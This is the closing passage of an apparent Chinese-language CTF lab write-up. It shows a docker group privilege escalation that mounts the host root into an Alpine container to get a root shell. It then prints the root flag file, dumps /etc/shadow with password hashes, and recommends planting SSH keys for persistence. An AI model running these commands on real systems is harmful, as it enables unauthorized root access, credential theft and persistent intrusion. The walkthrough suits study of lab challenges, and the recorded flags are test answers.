- `chroot /mnt sh`: 这是要在容器内执行的命令。`chroot` 命令用于将当前进程的根文件系统更改为指定的目录，从而创建一个新的执行环境。在这里，我们将根目录更改为容器内的 `/mnt` 目录，然后运行 `sh` 命令，即启动一个交互式的命令行终端。

综合起来，这个命令的作用是在一个基于 Alpine Linux 的 Docker 容器中创建一个交互式的终端，同时将主机的根文件系统挂载到容器内的 `/mnt` 目录，允许你在容器中执行命令并访问主机文件系统。这对于执行特定任务、调试问题或进行隔离环境中的操作非常有用。然而，需要注意使用这种方法时要谨慎，以避免意外修改或破坏主机文件系统。

```
anurodh@ubuntu:/$ groups
anurodh docker
anurodh@ubuntu:/$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# whoami
root
# cd ~
# pwd
/root
# ls -al
total 68
drwx------  6 root root  4096 Oct  4  2020 .
drwxr-xr-x 24 root root  4096 Oct  3  2020 ..
-rw-------  1 root root     0 Oct  4  2020 .bash_history
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Oct  3  2020 .cache
drwx------  3 root root  4096 Oct  3  2020 .gnupg
-rw-------  1 root root   370 Oct  4  2020 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root 12288 Oct  4  2020 .proof.txt.swp
drwx------  2 root root  4096 Oct  3  2020 .ssh
drwxr-xr-x  2 root root  4096 Oct  3  2020 .vim
-rw-------  1 root root 11683 Oct  4  2020 .viminfo
-rw-r--r--  1 root root   166 Oct  3  2020 .wget-hsts
-rw-r--r--  1 root root  1385 Oct  4  2020 proof.txt
```

```
# cat proof.txt


                                        {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  


--------------------------------------------Designed By -------------------------------------------------------
                                        |  Anurodh Acharya |
                                        ---------------------

                                     Let me know if you liked it.

Twitter
        - @acharya_anurodh
Linkedin
        - www.linkedin.com/in/anurodh-acharya-b1937116a
```

```
# cat /etc/shadow
root:$6$1pTOobEF$Xj5U6JsdR0oAflIA/4/P4ntiqgFZqT1Bi2mKIvTGE1Ce/INT3xRxZ2fsHudjIvsnHXNOxGUij4qQg3wqoZ7vM0:18538:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18538:0:99999:7:::
aurick:$6$3AcZ8AteJZAVN5S0$7AOBb.Un6t1kb17zB1opo/20d3uUvnrHZNwWXUI1Sa9F7dVQGlny.oIfSCdqq9qADkqWKfZDkvPPd91Io6hFs/:18538:0:99999:7:::
mysql:!:18538:0:99999:7:::
apaar:$6$SXprRuEP$rUDHyz.U/3zgJ2bPV2BV4fUKq2..R/5JDluxBnjIsHDHBpP6yFyt/ntJBTyLELQq9WuvCsl8Ku4Nqo88DZ6Ox1:18538:0:99999:7:::
anurodh:$6$W.nQepbh$oG744C411bDpF/0QmO5WFv2eu3iAtrCT9mrk8o2Y/jV4S0SnDwbYCyXwuoxM2PW5W99ACrY2jDTl67VjW1Uih/:18538:0:99999:7:::
ftp:*:18538:0:99999:7:::
```

# 总结
在Kali生成ssh密钥对，将公钥写入目标上用户家目录的.ssh目录下。就可以无需密码ssh远程登录目标主机。该方法可用于权限维持。

[docker](https://gtfobins.github.io/gtfobins/docker/)

需要当前用户有足够的权限运行docker，比如在docker组或者是root用户。它可以用于从受限环境中脱离，通过生成一个交互式系统shell。结果是一个root shell。

CTF做不出来及时看答案，别浪费时间，因为和渗透不一样，尤其是隐写术。

User Flag

{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}

Root Flag

{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}

